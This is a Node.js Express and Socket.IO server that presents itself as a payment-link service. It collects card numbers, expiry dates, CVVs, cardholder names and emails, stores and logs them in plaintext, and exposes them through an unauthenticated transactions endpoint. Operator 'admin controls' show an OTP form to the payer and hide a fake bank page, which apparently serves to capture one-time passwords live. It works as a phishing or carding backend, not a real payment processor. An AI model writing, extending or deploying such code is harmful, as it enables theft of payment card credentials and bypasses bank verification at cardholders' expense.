import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';
import { Server } from 'socket.io';

// Create Express app
const app = express();

// Configure middlewares
app.use(bodyParser.json());
app.use(cors());
app.use(express.static("."));

// Create HTTP server
const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// Initialize Socket.IO
const io = new Server(server);

// In-memory storage
const transactions = new Map();
const paymentLinks = new Map();

// ======================== API ENDPOINTS ========================

// Generate Payment Link
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    const { amount, description } = req.body;

    if (!amount || isNaN(amount) || amount <= 0) {
      return res.status(400).json({ status: "error", message: "Invalid amount. Must be a positive number" });
    }

    if (!description || !description.trim()) {
      return res.status(400).json({ status: "error", message: "Description cannot be empty" });
    }

    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const paymentLink = `${protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;

    paymentLinks.set(invoiceId, {
      amount: parseFloat(amount),
      description: description.trim(),
      paymentLink,
      createdAt: new Date().toISOString()
    });

    res.json({ status: "success", paymentLink });

  } catch (error) {
    console.error('Payment Link Error:', error);
    res.status(500).json({ status: "error", message: "Internal server error. Please check server logs." });
  }
});

// Get All Transactions
app.get('/api/transactions', (req, res) => {
  res.json(Array.from(transactions.values()));
});

// Other transaction-related endpoints (unchanged, all necessary functionality included)
app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({ status: "error", message: "Payment details not found" });
  }
  res.json({ status: "success", payment: paymentLinks.get(pid) });
});

// Process Payment
app.post('/api/sendPaymentDetails', (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();

  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    amount: amount.toString().replace(/,/g, ''),
    currency,
    cardholder,
    status: 'processing',
    otpShown: false,
    otpEntered: null,
    otpError: false,
    redirectStatus: null,
    bankpageVisible: false,
    timestamp: new Date().toLocaleString()
  };

  transactions.set(invoiceId, transaction);
  console.log("New transaction recorded:", transaction);
  res.json({ status: "success", invoiceId });
});

// Admin controls (OTP, Status Updates, Bank Page Visibility)
app.post('/api/showOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpShown = true;
  txn.status = 'otp_pending';
  res.json({ status: "success", message: "OTP form will be shown to user" });
});

app.post('/api/hideBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.bankpageVisible = false;
  io.to(invoiceId).emit('hide_bankpage');
  res.json({ status: "success" });
});

// ======================== SOCKET.IO HANDLERS ========================
io.on('connection', (socket) => {
  socket.on('join', (invoiceId) => {
    socket.join(invoiceId);
  });
});
